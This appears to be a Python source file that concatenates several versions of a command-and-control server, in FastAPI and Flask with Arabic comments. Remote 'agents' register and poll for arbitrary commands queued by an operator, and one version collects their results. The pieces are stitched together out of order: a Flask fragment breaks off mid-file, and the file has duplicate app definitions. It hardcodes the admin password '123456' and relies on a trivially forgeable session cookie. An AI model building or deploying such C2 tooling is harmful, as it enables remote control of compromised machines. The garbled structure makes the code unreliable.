from fastapi import FastAPI, Request, Form, status
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
from typing import Dict
import threading
import time

app = FastAPI()
templates = Jinja2Templates(directory="templates")

ADMIN_USER = "admin"
ADMIN_PASS = "123456"

agents: Dict[str, dict] = {}
commands: Dict[str, str] = {}

def is_logged_in(request: Request):
    return request.cookies.get("session") == "active"

@app.get("/", response_class=HTMLResponse)
async def dashboard(request: Request):
    if not is_logged_in(request):
        return templates.TemplateResponse("login.html", {"request": request})
    return templates.TemplateResponse("index.html", {
        "request": request,
        "agents": agents
    })

@app.post("/login")
async def login(username: str = Form(...), password: str = Form(...)):
    if username == ADMIN_USER and password == ADMIN_PASS:
        resp = RedirectResponse("/", status_code=status.HTTP_303_SEE_OTHER)
        resp.set_cookie("session", "active", httponly=True)
        return resp
    return HTMLResponse("Access Denied")

@app.get("/logout")
async def logout():
    resp = RedirectResponse("/")
    resp.delete_cookie("session")
    return resp

@app.post("/register")
async def register(data: dict):
    agent_id = data.get("agent_id")
    agents[agent_id] = data
    return {"status": "ok"}

@app.post("/poll")
async def poll(data: dict):
    agent_id = data.get("agent_id")
    cmd = commands.pop(agent_id, None)
    return {"command": cmd} if cmd else {"status": "idle"}

@app.post("/send_command")
async def send_command(
    request: Request,
    agent_id: str = Form(...),
    command: str = Form(...)
):
    if is_logged_in(request):
        commands[agent_id] = command
    return RedirectResponse("/", status_code=status.HTTP_303_SEE_OTHER)
from flask import Flask, render_template, request, jsonify
import json
from datetime import datetime

app = Flask(__name__)

# مخزن مؤقت للبيانات (في الإنتاج يفضل استخدام SQLite)
agents = {}
commands = {}

@app.route('/')
def index():
    return render_template('index.html', agents=agents)

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    agent_id = data['agent_id']
    data['last_seen'] = datetime.now().strftime("%H:%M:%S")
    data['status'] = "Online"
    agents[agent_id] = data
    return jsonify({"status": "success"})from fastapi import FastAPI, Request, Form, status
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel
from typing import Dict, Optional
import uvicorn

app = FastAPI()
templates = Jinja2Templates(directory="templates")

# --- الإعدادات ---
ADMIN_USER = "admin"
ADMIN_PASS = "123456" # غيرها فوراً

agents: Dict[str, dict] = {}
commands: Dict[str, str] = {}

def is_logged_in(request: Request):
    return request.cookies.get("session") == "active"

@app.get("/", response_class=HTMLResponse)
async def dashboard(request: Request):
    if not is_logged_in(request):
        return templates.TemplateResponse("login.html", {"request": request})
    return templates.TemplateResponse("index.html", {"request": request, "agents": agents})

@app.post("/login")
async def login(username: str = Form(...), password: str = Form(...)):
    if username == ADMIN_USER and password == ADMIN_PASS:
        resp = RedirectResponse(url="/", status_code=status.HTTP_303_SEE_OTHER)
        resp.set_cookie(key="session", value="active", httponly=True)
        return resp
    return HTMLResponse("Access Denied")

@app.get("/logout")
async def logout():
    resp = RedirectResponse(url="/")
    resp.delete_cookie("session")
    return resp

@app.post("/register")
async def register(data: dict):
    agent_id = data.get('agent_id')
    agents[agent_id] = data
    return {"status": "ok"}

@app.post("/poll")
async def poll(data: dict):
    agent_id = data.get('agent_id')
    if data.get('result') and agent_id in agents:
        agents[agent_id]['last_result'] = data['result']
    
    cmd = commands.pop(agent_id, None)
    return {"command": cmd} if cmd else {"status": "idle"}

@app.post("/send_command")
async def send_command(request: Request, agent_id: str = Form(...), command: str = Form(...)):
    if is_logged_in(request):
        commands[agent_id] = command
    return RedirectResponse(url="/", status_code=status.HTTP_303_SEE_OTHER)

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)

@app.route('/poll', methods=['POST'])
def poll():
    agent_id = request.json.get('agent_id')
    if agent_id in agents:
        agents[agent_id]['last_seen'] = datetime.now().strftime("%H:%M:%S")
        
    # التحقق من وجود أوامر لهذا الجهاز
    cmd = commands.pop(agent_id, None)
    if cmd:
        return jsonify({"command": cmd})
    return jsonify({"status": "no_commands"})

@app.route('/send_command', methods=['POST'])
def send_command():
    agent_id = request.form.get('agent_id')
    cmd = request.form.get('command')
    commands[agent_id] = cmd
    return "Command Sent!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
